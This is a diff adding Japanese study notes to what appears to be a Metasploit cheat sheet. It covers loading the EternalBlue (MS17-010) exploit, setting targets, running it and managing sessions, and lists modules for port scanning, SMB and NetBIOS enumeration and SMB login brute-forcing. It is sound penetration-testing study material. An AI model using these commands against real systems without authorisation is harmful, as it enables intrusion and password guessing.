@@ -662,3 +662,62 @@ search ms17-010
 # 補助モジュールのみを検索
 search type:auxiliary telnet
 ```
+
+### Windows攻略例
+
+```bash
+use exploit/windows/smb/ms17_010_eternalblue
+# 使用可能オプション確認
+show options
+set rhosts [target IP]
+# Setされたか確認
+show options
+# Setしたオプションをクリア
+unset rhosts # 指定
+unset all # すべて
+
+# グローバル設定（setg）：Metasploit終了 or ensetgでクリアするまで保持
+setg rhosts [target IP]
+
+# Exploit実行（zオプションはバックグランド実行）
+exploit -z
+
+# 悪用されることなく脆弱かをチェック（一部のモジュールが対応）
+check
+# セッションをバックグラウンド実行し、プロンプトに戻る
+background
+# Ctrl+zでバックグラウンドに戻る
+# 任意のコンテキストからセッションを確認
+sessions
+# 指定IDのセッションに入る
+sessions -i 2
+```
+
+### Metasploit: Exploit
+
+- /usr/share/wordlists/metasploit/ にWordListがある
+
+```bash
+search portscan
+# TCPポートスキャンを使用
+use auxiliary/scanner/portscan/tcp
+# 必要な情報をセット
+set rhosts [target IP]
+# 実行
+run
+# nmapでスキャン
+# sudo nmap -sS [target IP]
+
+# ポートスキャン
+use auxiliary/scanner/portscan/tcp
+# UDPサービス識別
+use auxiliary/scanner/discovery/udp_sweep
+# SMBスキャン
+use auxiliary/scanner/smb/smb_version
+# NetBIOS名確認
+use auxiliary/scanner/netbios/nbname
+# 対象ポートで実行されているサービス確認
+use auxiliary/scanner/http/http_version
+# SMBパスワード
+auxiliary/scanner/smb/smb_login
+```
